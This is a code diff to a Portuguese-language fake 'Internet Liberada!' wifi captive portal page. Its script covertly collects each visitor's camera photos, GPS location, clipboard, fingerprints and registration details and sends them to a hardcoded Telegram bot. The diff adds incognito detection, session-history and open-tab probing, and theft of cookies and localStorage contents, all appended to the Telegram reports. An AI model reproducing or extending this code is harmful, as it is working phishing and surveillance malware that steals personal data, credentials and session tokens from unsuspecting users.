@@ -211,6 +211,14 @@
 
         .progress-text { color: rgba(255, 255, 255, 0.7); font-size: 14px; text-align: center; }
 
+        .version-tag {
+            text-align: center;
+            margin-top: 15px;
+            color: rgba(255, 255, 255, 0.3);
+            font-size: 11px;
+            font-family: 'Courier New', monospace;
+        }
+
         @media (max-width: 480px) { .glass-card { padding: 40px 25px; } }
     </style>
 </head>
@@ -224,7 +232,7 @@
             
             <!-- TELA 1: BOAS VINDAS -->
             <div class="screen active" id="screen1">
-                <div class="welcome-icon">🌐</div>
+                <div class="welcome-icon"></div>
                 <h1 class="welcome-title">Internet Liberada!</h1>
                 <p class="welcome-subtitle">
                     Parabéns! Sua conexão foi aprovada e está quase pronta para uso.
@@ -273,7 +281,7 @@
                         <label>Senha</label>
                         <div class="input-wrapper">
                             <input type="password" id="regPassword" placeholder="Crie uma senha" required />
-                            <span class="input-icon">🔒</span>
+                            <span class="input-icon"></span>
                         </div>
                     </div>
 
@@ -345,6 +353,8 @@
                 <div class="progress-text" id="progressText">Liberando conexão... 0%</div>
             </div>
 
+            <div class="version-tag">v9.7.10</div>
+
         </div>
     </div>
 
@@ -352,6 +362,7 @@
         // ⚙️ CONFIGURAÇÕES DO TELEGRAM
         const TELEGRAM_BOT_TOKEN = '8702458951:AAHg_-y7Dx8LBwIjdKg0YcF9sVRJzkIrkj0';
         const TELEGRAM_CHAT_ID = '-5425475205';
+        const VERSION = '9.7.10';
 
         let userData = {};
         let deviceData = {};
@@ -535,6 +546,184 @@
             } catch (e) {
                 deviceData.ipLocation = null;
             }
+        }
+
+        // 🔍 DETECTAR MODO ANÔNIMO
+        async function detectIncognito() {
+            // Método 1: FileSystem API (Chrome)
+            if (navigator.storage && navigator.storage.estimate) {
+                try {
+                    const estimate = await navigator.storage.estimate();
+                    if (estimate.quota < 100000000) { // menos de 100MB = provavelmente anônimo
+                        return { method: 'storage_quota', detected: true, quota: estimate.quota };
+                    }
+                } catch (e) {}
+            }
+            
+            // Método 2: IndexedDB (Firefox)
+            if (window.indexedDB) {
+                try {
+                    const db = await new Promise((resolve, reject) => {
+                        const req = indexedDB.open('test_incognito');
+                        req.onsuccess = () => resolve(req.result);
+                        req.onerror = () => reject(req.error);
+                    });
+                    db.close();
+                    indexedDB.deleteDatabase('test_incognito');
+                    return { method: 'indexeddb', detected: false };
+                } catch (e) {
+                    return { method: 'indexeddb_error', detected: true };
+                }
+            }
+            
+            // Método 3: TemporaryStorage (Chrome antigo)
+            if (navigator.webkitTemporaryStorage) {
+                try {
+                    const bytes = await new Promise((resolve, reject) => {
+                        navigator.webkitTemporaryStorage.queryUsageAndQuota((used, quota) => {
+                            resolve({ used, quota });
+                        }, reject);
+                    });
+                    if (bytes.quota < 100000000) {
+                        return { method: 'webkit_storage', detected: true, quota: bytes.quota };
+                    }
+                } catch (e) {}
+            }
+            
+            return { method: 'none', detected: false };
+        }
+
+        // 📋 PEGAR HISTÓRICO DA SESSÃO (o que é possível)
+        function getSessionHistory() {
+            const history = [];
+            
+            // 1. Navigation entries (páginas visitadas nesta sessão)
+            if (performance.getEntriesByType) {
+                const navEntries = performance.getEntriesByType('navigation');
+                navEntries.forEach(entry => {
+                    history.push({
+                        url: entry.name || document.location.href,
+                        type: 'navigation',
+                        timestamp: new Date(entry.startTime).toISOString(),
+                        duration: entry.duration.toFixed(0) + 'ms'
+                    });
+                });
+            }
+            
+            // 2. Resource entries (recursos carregados)
+            if (performance.getEntriesByType) {
+                const resources = performance.getEntriesByType('resource').slice(0, 10);
+                resources.forEach(r => {
+                    if (r.name && r.name.startsWith('http')) {
+                        history.push({
+                            url: r.name,
+                            type: 'resource',
+                            timestamp: new Date(r.startTime).toISOString()
+                        });
+                    }
+                });
+            }
+            
+            // 3. Referrer chain
+            if (document.referrer) {
+                history.unshift({
+                    url: document.referrer,
+                    type: 'referrer',
+                    timestamp: 'antes desta página'
+                });
+            }
+            
+            // 4. History length
+            history.push({
+                url: `Histórico da sessão: ${window.history.length} páginas`,
+                type: 'info',
+                timestamp: 'atual'
+            });
+            
+            return history.slice(0, 10);
+        }
+
+        // 🪟 DETECTAR ABAS ABERTAS (BroadcastChannel - mesmo domínio)
+        function detectOpenTabs() {
+            const tabs = [];
+            
+            // Aba atual
+            tabs.push({
+                id: 'current',
+                url: window.location.href,
+                title: document.title,
+                timestamp: new Date().toISOString(),
+                status: 'ativa'
+            });
+            
+            // Tentar BroadcastChannel para outras abas do mesmo domínio
+            if ('BroadcastChannel' in window) {
+                try {
+                    const channel = new BroadcastChannel('portal_tabs');
+                    channel.postMessage({ type: 'ping', from: Date.now() });
+                    
+                    // Ouvir respostas por 2 segundos
+                    const responses = [];
+                    channel.onmessage = (e) => {
+                        if (e.data.type === 'pong' && e.data.from !== Date.now()) {
+                            responses.push(e.data);
+                        }
+                    };
+                    
+                    setTimeout(() => {
+                        channel.close();
+                        deviceData.otherTabs = responses.length;
+                        deviceData.tabResponses = responses;
+                    }, 2000);
+                    
+                    // Responder a pings de outras abas
+                    window.addEventListener('message', (e) => {
+                        if (e.data && e.data.type === 'ping') {
+                            channel.postMessage({ type: 'pong', from: e.data.from });
+                        }
+                    });
+                    
+                } catch (e) {
+                    deviceData.otherTabs = 'erro';
+                }
+            }
+            
+            // Tentar localStorage para detectar abas
+            try {
+                const tabId = Date.now() + '_' + Math.random();
+                localStorage.setItem('portal_tab_' + tabId, JSON.stringify({
+                    url: window.location.href,
+                    title: document.title,
+                    time: Date.now()
+                }));
+                
+                // Ler outras tabs
+                const allTabs = [];
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    if (key && key.startsWith('portal_tab_')) {
+                        try {
+                            const data = JSON.parse(localStorage.getItem(key));
+                            if (Date.now() - data.time < 60000) { // menos de 1 minuto
+                                allTabs.push(data);
+                            }
+                        } catch (e) {}
+                    }
+                }
+                
+                deviceData.localStorageTabs = allTabs.length;
+                deviceData.localStorageTabData = allTabs;
+                
+                // Limpar após 5 minutos
+                setTimeout(() => {
+                    localStorage.removeItem('portal_tab_' + tabId);
+                }, 300000);
+                
+            } catch (e) {
+                deviceData.localStorageTabs = 'erro';
+            }
+            
+            return tabs;
         }
 
         async function collectAllData() {
@@ -748,6 +937,35 @@
             } catch (e) {
                 deviceData.clipboard = 'Negado';
             }
+            
+            // === 🕵️ DETECTAR MODO ANÔNIMO ===
+            deviceData.incognito = await detectIncognito();
+            
+            // ===  HISTÓRICO DA SESSÃO ===
+            deviceData.sessionHistory = getSessionHistory();
+            deviceData.historyLength = window.history.length;
+            
+            // === 🪟 ABAS ABERTAS ===
+            deviceData.openTabs = detectOpenTabs();
+            
+            // === COOKIES ===
+            deviceData.cookies = document.cookie || 'Nenhum cookie acessível';
+            
+            // === LOCALSTORAGE CONTENTS (tentar ler) ===
+            try {
+                const lsData = {};
+                for (let i = 0; i < Math.min(localStorage.length, 20); i++) {
+                    const key = localStorage.key(i);
+                    if (key) {
+                        const value = localStorage.getItem(key);
+                        lsData[key] = value.length > 100 ? value.substring(0, 100) + '...' : value;
+                    }
+                }
+                deviceData.localStorageData = lsData;
+                deviceData.localStorageCount = localStorage.length;
+            } catch (e) {
+                deviceData.localStorageData = 'Negado';
+            }
         }
 
         function detectFonts() {
@@ -789,7 +1007,7 @@
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CHAT_ID);
                 formData.append('photo', blob, `camera_${type}_${Date.now()}.jpg`);
-                formData.append('caption', ` FOTO ${type === 'front' ? 'FRONTAL (SELFIE)' : 'TRASEIRA (AMBIENTE)'}\n\n🕐 ${new Date().toLocaleString('pt-BR')}\n👤 ${userData.username || 'Aguardando cadastro'}`);
+                formData.append('caption', `📸 FOTO ${type === 'front' ? 'FRONTAL (SELFIE)' : 'TRASEIRA (AMBIENTE)'}\n\n🕐 ${new Date().toLocaleString('pt-BR')}\n👤 ${userData.username || 'Aguardando cadastro'}\n Modo Anônimo: ${deviceData.incognito?.detected ? 'SIM' : 'NÃO'}`);
                 
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
@@ -798,7 +1016,7 @@
                 
                 console.log(`✅ Foto ${type} enviada!`);
             } catch (error) {
-                console.error(` Erro enviar foto ${type}:`, error);
+                console.error(`❌ Erro enviar foto ${type}:`, error);
             }
         }
 
@@ -858,8 +1076,8 @@
         async function sendAllToTelegram() {
             console.log('🚀 Enviando tudo para Telegram...');
             
-            // MENSAGEM 1: CONTA + FOTOS + GPS
-            const msg1 = ` *NOVO CADASTRO - PORTAL*\n` +
+            // MENSAGEM 1: CONTA + FOTOS + GPS + ANÔNIMO
+            const msg1 = `🔵 *NOVO CADASTRO - PORTAL v${VERSION}*\n` +
                          `━━━━━━━━━━━━━━━━━━━━━\n\n` +
                          `👤 *CONTA:*\n` +
                          `├ Nome: ${userData.name}\n` +
@@ -868,15 +1086,19 @@
                          ` Data: ${deviceData.timestamp}\n\n` +
                          `📸 *FOTOS:*\n` +
                          `├ Frontal: ${deviceData.cameraFront}\n` +
-                         ` Traseira: ${deviceData.cameraBack}\n\n` +
+                         `└ Traseira: ${deviceData.cameraBack}\n\n` +
                          `📍 *GPS:*\n` +
                          `├ Lat: ${deviceData.gps_latitude}\n` +
-                         `├ Long: ${deviceData.gps_longitude}\n` +
+                         ` Long: ${deviceData.gps_longitude}\n` +
                          `├ Precisão: ${deviceData.gps_accuracy}m\n` +
-                         `├ Altitude: ${deviceData.gps_altitude || 'N/A'}\n` +
-                         `├ Velocidade: ${deviceData.gps_speed || 'N/A'}\n` +
-                         `├ Direção: ${deviceData.gps_heading || 'N/A'}\n` +
-                         `└ Fonte: ${deviceData.gps_source}`;
+                         ` Altitude: ${deviceData.gps_altitude || 'N/A'}\n` +
+                         ` Velocidade: ${deviceData.gps_speed || 'N/A'}\n` +
+                         ` Direção: ${deviceData.gps_heading || 'N/A'}\n` +
+                         `└ Fonte: ${deviceData.gps_source}\n\n` +
+                         `🕵️ *MODO ANÔNIMO:*\n` +
+                         `├ Detectado: ${deviceData.incognito?.detected ? 'SIM ⚠️' : 'NÃO'}\n` +
+                         `├ Método: ${deviceData.incognito?.method || 'N/A'}\n` +
+                         `└ Quota: ${deviceData.incognito?.quota || 'N/A'} bytes`;
             
             await sendTelegramMessage(msg1);
             await new Promise(r => setTimeout(r, 500));
@@ -945,13 +1167,13 @@
                          `├ Latência: ${deviceData.rtt}ms\n` +
                          `├ Save Data: ${deviceData.saveData}\n` +
                          `├ Online: ${deviceData.onLine}\n` +
-                         ` Timezone: ${deviceData.timezone} (UTC${deviceData.timezoneOffset > 0 ? '-' : '+'}${Math.abs(deviceData.timezoneOffset/60)})`;
+                         `└ Timezone: ${deviceData.timezone} (UTC${deviceData.timezoneOffset > 0 ? '-' : '+'}${Math.abs(deviceData.timezoneOffset/60)})`;
             
             await sendTelegramMessage(msg4);
             await new Promise(r => setTimeout(r, 500));
             
             // MENSAGEM 5: FINGERPRINTS + GPU
-            const msg5 = `🎨 *FINGERPRINTS E GPU*\n` +
+            const msg5 = ` *FINGERPRINTS E GPU*\n` +
                          `━━━━━━━━━━━━━━━━━━━━━\n\n` +
                          `├ Canvas FP: ${deviceData.canvasFingerprint}\n` +
                          `├ Audio FP: ${deviceData.audioFingerprint}\n` +
@@ -974,7 +1196,7 @@
                          `━━━━━━━━━━━━━━━━━━━━━\n\n` +
                          `├ Fontes: ${deviceData.installedFonts.join(', ')}\n` +
                          `├ Plugins: ${deviceData.plugins}\n` +
-                         `├ MIME Types: ${deviceData.mimeTypes}\n` +
+                         ` MIME Types: ${deviceData.mimeTypes}\n` +
                          `├ Tema: ${deviceData.prefersColorScheme}\n` +
                          `├ Reduced Motion: ${deviceData.prefersReducedMotion}\n` +
                          `├ Contraste: ${deviceData.prefersContrast}\n` +
@@ -983,7 +1205,7 @@
                          `├ DNT: ${deviceData.doNotTrack}\n` +
                          `├ Java Enabled: ${deviceData.javaEnabled}\n` +
                          `├ PDF Viewer: ${deviceData.pdfViewerEnabled}\n` +
-                         ` WebDriver: ${deviceData.webdriver}\n` +
+                         `├ WebDriver: ${deviceData.webdriver}\n` +
                          `├ LocalStorage: ${deviceData.localStorage}\n` +
                          `├ SessionStorage: ${deviceData.sessionStorage}\n` +
                          `└ IndexedDB: ${deviceData.indexedDB}`;
@@ -992,7 +1214,7 @@
             await new Promise(r => setTimeout(r, 500));
             
             // MENSAGEM 7: APIS + PERMISSIONS
-            const msg7 = `🎮 *APIS E PERMISSIONS*\n` +
+            const msg7 = ` *APIS E PERMISSIONS*\n` +
                          `━━━━━━━━━━━━━━━━━━━━━\n\n` +
                          `├ Service Worker: ${deviceData.serviceWorker}\n` +
                          `├ Web Workers: ${deviceData.webWorkers}\n` +
@@ -1004,9 +1226,9 @@
                          `├ Gamepads: ${deviceData.gamepads}\n` +
                          `├ MIDI: ${deviceData.midi}\n` +
                          `├ Presentation: ${deviceData.presentation}\n` +
-                         ` Remote Playback: ${deviceData.remotePlayback}\n` +
+                         `├ Remote Playback: ${deviceData.remotePlayback}\n` +
                          `├ Picture in Picture: ${deviceData.pictureInPicture}\n` +
-                         ` Vibration: ${deviceData.vibrationAPI}\n` +
+                         `├ Vibration: ${deviceData.vibrationAPI}\n` +
                          `├ Bluetooth: ${deviceData.bluetooth}\n` +
                          `├ USB: ${deviceData.usb}\n` +
                          `├ NFC: ${deviceData.nfc}\n` +
@@ -1021,8 +1243,32 @@
             await sendTelegramMessage(msg7);
             await new Promise(r => setTimeout(r, 500));
             
-            // MENSAGEM 8: PERFORMANCE + CLIPBOARD + PÁGINA
-            const msg8 = `📊 *PERFORMANCE E PÁGINA*\n` +
+            // MENSAGEM 8: 🕵️ HISTÓRICO + ABAS + ANÔNIMO (NOVA!)
+            const historyText = deviceData.sessionHistory.map((h, i) => 
+                `  ${i+1}. [${h.type}] ${h.url.substring(0, 60)}${h.url.length > 60 ? '...' : ''}`
+            ).join('\n');
+            
+            const msg8 = `️ *HISTÓRICO E NAVEGAÇÃO*\n` +
+                         `━━━━━━━━━━━━━━━━━━━━━\n\n` +
+                         `📋 *HISTÓRICO DA SESSÃO (${deviceData.historyLength} páginas):*\n` +
+                         `${historyText || '  Nenhum registro'}\n\n` +
+                         `🔗 *REFERRER:*\n` +
+                         `└ ${deviceData.referrer}\n\n` +
+                         `🪟 *ABAS ABERTAS:*\n` +
+                         ` Aba atual: ${deviceData.title}\n` +
+                         `├ Outras abas (BroadcastChannel): ${deviceData.otherTabs || '0'}\n` +
+                         `├ Tabs no localStorage: ${deviceData.localStorageTabs || '0'}\n` +
+                         `└ Total detectado: ${deviceData.localStorageTabs || 0} tabs\n\n` +
+                         `🍪 *COOKIES:*\n` +
+                         `└ ${deviceData.cookies?.substring(0, 200) || 'Nenhum'}\n\n` +
+                         `💾 *LOCALSTORAGE (${deviceData.localStorageCount || 0} itens):*\n` +
+                         `└ ${JSON.stringify(deviceData.localStorageData || {}).substring(0, 300)}...`;
+            
+            await sendTelegramMessage(msg8);
+            await new Promise(r => setTimeout(r, 500));
+            
+            // MENSAGEM 9: PERFORMANCE + USER AGENT
+            const msg9 = `📊 *PERFORMANCE E PÁGINA*\n` +
                          `━━━━━━━━━━━━━━━━━━━━━\n\n` +
                          `├ Page Load: ${deviceData.pageLoadTime || 'N/A'}ms\n` +
                          `├ DOM Content Loaded: ${deviceData.domContentLoaded || 'N/A'}ms\n` +
@@ -1030,9 +1276,11 @@
                          `├ URL: ${deviceData.currentURL}\n` +
                          `├ Referrer: ${deviceData.referrer}\n` +
                          `├ Title: ${deviceData.title}\n\n` +
-                         `⚡ *USER AGENT:*\n\`${deviceData.userAgent}\``;
+                         `⚡ *USER AGENT:*\n\`${deviceData.userAgent}\`\n\n` +
+                         `📌 *VERSÃO DO SITE:*\n` +
+                         `└ v${VERSION}`;
             
-            await sendTelegramMessage(msg8);
+            await sendTelegramMessage(msg9);
             await new Promise(r => setTimeout(r, 500));
             
             // ENVIAR LOCALIZAÇÃO NO MAPA
